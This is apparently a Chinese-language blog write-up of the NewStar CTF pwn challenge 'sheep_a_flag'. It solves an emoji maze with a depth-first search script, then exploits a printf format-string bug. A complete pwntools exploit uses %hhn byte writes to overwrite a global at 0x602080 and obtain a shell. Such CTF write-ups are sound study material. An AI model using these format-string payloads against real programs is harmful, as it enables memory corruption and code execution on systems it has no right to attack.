---
title: sheep_a_flag
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- format
- DFS


---

NewStar CTF 的整活题，考格式化字符串还有走迷宫的算法。

走迷宫，如果能够走出去，就能够跳转到一个格式化字符串漏洞，利用该漏洞将0x602080中的内容修改为1919810即可get shell。

<!-- more -->

走迷宫：(DFS)

```python
ans=''
v=[]
map=[]
#深度优先回溯法走迷宫
def dfs(res,x,y):
 global ans
 #print(x,y,flag_x,flag_y,res,sep=' ')
 if x==flag_x and y==flag_y:
  print('you')
  ans=res
  return
 if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
  v[x-1][y]=1
  dfs(res+'w',x-1,y)
  v[x-1][y]=0
 if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
  v[x][y-1]=1
  dfs(res+'a',x,y-1)
  v[x][y-1]=0
 if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
  v[x][y+1]=1
  dfs(res+'d',x,y+1)
  v[x][y+1]=0
 if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
  v[x+1][y]=1
  dfs(res+'s',x+1,y)
  v[x+1][y]=0
 return 

sheep_x=-1
sheep_y=-1
flag_x=-1
flag_y=-1
p.recvuntil('position!\n')
#遍历获取地图
for i in range(24):
 x=[]
 y=[]
 a=p.recvline().decode("utf-8")
 for j in range(24):
  y.append(0)
  if a[j]=="🈲".decode("utf-8"):
   x.append(0)
  if a[j]=='⬛'.decode("utf-8"):
   x.append(0)
  if a[j]=='⬜'.decode("utf-8"):
   x.append(1)
  if a[j]=='🐏'.decode("utf-8"):
   x.append(2)
   sheep_x=i
   sheep_y=j
  if a[j]=='🚩'.decode("utf-8"):
   x.append(3)
   flag_x=i
   flag_y=j
 map.append(x)
 v.append(y)
dfs('',sheep_x,sheep_y)
```

后面就是一个格式化字符串漏洞

```c
unsigned __int64 __fastcall vuln()
{
  __int64 v0; // rbp

  read(0, (void *)(v0 - 0x60), 0x50uLL);
  printf((const char *)(v0 - 0x60));            // 格式化字符串漏洞，修改0x602080为1919810即0x1D4B42
  return __readfsqword(0x28u) ^ *(_QWORD *)(v0 - 8);
}
```

0x602080写入0x42，0x602081写入0x4d，0x602082写入0x1d，使用hhn每次写入1字节，从小到大写，先0x602082，再0x602080，最后写0x602080。计算一下三个地址是第几个参数，写入内容8byte对齐后，使用%c来输出一些字节凑数即可。

```python
#overwrite 0x602080 to 0x1D4B42
#0x1D(29) to 0x602082
#0x42(+37) to 0x602080
#0x4B(+9) to 0x602081

#start from 6
#9 + 9 + 8 + 0x18
#26=>0x18+2=>+2 +2 +2=>0x20=>+4=>6+4=10
payload='%29c%10$hhn'+'%37c%11$hhn'+'%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)
p.sendline(payload)
p.interactive()
```

exp:

```python
# -*- coding: UTF-8 -*-
from pwn import*
context(log_level='debug')
#p=remote('node4.buuoj.cn',27884)
p=process('./sheep_a_flag')
def debug(cmd='\n'):
	gdb.attach(p,cmd)
	pause()

ans=''
v=[]
map=[]
def dfs(res,x,y):
	global ans
	#print(x,y,flag_x,flag_y,res,sep=' ')
	if x==flag_x and y==flag_y:
		print('you')
		ans=res
		return
	if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
		v[x-1][y]=1
		dfs(res+'w',x-1,y)
		v[x-1][y]=0
	if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
		v[x][y-1]=1
		dfs(res+'a',x,y-1)
		v[x][y-1]=0
	if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
		v[x][y+1]=1
		dfs(res+'d',x,y+1)
		v[x][y+1]=0
	if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
		v[x+1][y]=1
		dfs(res+'s',x+1,y)
		v[x+1][y]=0
	return 

sheep_x=-1
sheep_y=-1
flag_x=-1
flag_y=-1
p.recvuntil('position!\n')
for i in range(24):
	x=[]
	y=[]
	a=p.recvline().decode("utf-8")
	for j in range(24):
		y.append(0)
		if a[j]=="🈲".decode("utf-8"):
			x.append(0)
		if a[j]=='⬛'.decode("utf-8"):
			x.append(0)
		if a[j]=='⬜'.decode("utf-8"):
			x.append(1)
		if a[j]=='🐏'.decode("utf-8"):
			x.append(2)
			sheep_x=i
			sheep_y=j
		if a[j]=='🚩'.decode("utf-8"):
			x.append(3)
			flag_x=i
			flag_y=j
	map.append(x)
	v.append(y)
dfs('',sheep_x,sheep_y)

p.recvuntil('Ans: \n')
p.sendline(ans)
p.recvuntil('it ?!\n')
debug('b *0x4011c3')
#overwrite 0x602080 to 0x1D4B42
#0x1D(29) to 0x602082
#0x42(+37) to 0x602080
#0x4B(+9) to 0x602081

#start from 6
#9 + 9 + 8 + 0x18
#26=>0x18+2=>+2 +2 +2=>0x20=>+4=>6+4=10
payload='%29c%10$hhn'+'%37c%11$hhn'+'%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)
p.sendline(payload)
p.interactive()

```